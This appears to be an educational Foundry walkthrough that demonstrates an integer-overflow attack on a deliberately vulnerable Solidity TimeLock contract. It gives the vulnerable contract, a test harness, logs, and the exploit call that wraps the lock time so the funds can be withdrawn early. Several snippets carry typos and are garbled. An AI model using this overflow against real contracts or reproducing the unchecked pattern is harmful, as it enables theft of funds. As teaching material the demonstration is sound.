# Foundry 3


``` text copy
// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import “forge-std/Test.sol”;
```

# TimeLock

```
contract TimeLock {
    // using Safefor uint256;
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");                                    require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");                                     require(sent, "Failed to send Ether");
    }
}
```

# Contract Test

``` text copy
contract ContractTest is Test {
    TimeLock public TimeLockContract;
    
    address alice; 
    address bob;

    function setUp() public {
    TimeLockContract = new TimeLock();

    //alice = vm.addr(1);                                    
    alice = makeAddr("alice");                                     
    // bob = vm.addr(2);                                     
    bob = makeAddr("bob"); 
    }
}
```


**forge test — contracts ./src/test/OverFlow.sol -vvvv**

``` text copy
Running 1 test for test/OverFlow.sol:ContractTest
[PASS] testFailOverflow() (gas: 175525)
Logs:
    Alice balance: 1.000000000000000000
    Bob balance: 1.0000000000000000
    Alice deposit 1 Ether...
    Alice balance: 0.000000000000000000
    Bob deposit 1 Ether...
    Bob balance: 0.000000000000000000
    Bob will successfully to withdraw, because the lock time is overflowed
    Bob balance: 1.000000000000000000
    Alice will fail to withdraw, because the lock time not expired
```

``` text copy
vm.deal(alice, 1 ether);
vm.deal(bob, 1 ether);
// console.log("Alice balance", alice.balance);
emit log_named_decimal_uint("Alice balance",alicebalance18);
// console.log("Bob balance", bob.balance);
emit log_named_decimal_uint("Bob balance", bob.balance, 18);
```

``` text copy
console.log("Alice deposit 1 Ether...");
vm.prank(alice);
TimeLockContract.deposit{value: 1 ether}();
emit log_named_decimal_uint("Alice balance",alicebalance18);
// console.log("Alice balance", alice.balance);
```

``` text copy
console.log("Bob deposit 1 Ether...");
vm.startPrank(bob);
TimeLockContract.deposit{value: 1 ether}();
emit log_named_decimal_uint("Bob balance", bob.balance, 18);
// console.log("Bob balance", bob.balance);
```

# Theory for hacking

``` text copy
// bob locktime = t                                    
// x=overflow == type(uint).max + 1
// t + x = type(uint).max + 1
// x = type(uint).max + 1 - t
```

# Now Action

``` text copy
TimeLockContract.increaseLockTime(
    type(uint).max + 1 - TimeLockContract.lockTime(bob)
);

console.log("Bob will successfully to withdraw, because the lock time is overflowed");
```

``` text copy
TimeLockContract.withdraw();
// console.log("Bob balance", bob.balance);
emit log_named_decimal_uint("Bob balance", bob.balance, 18);
vm.stopPrank();
```

``` text copy
vm.parnk(alice);
console.log("Alice will fail to withdrow, because the lock time not expired");
TimeLockContract.withdraw();
// expect revert
```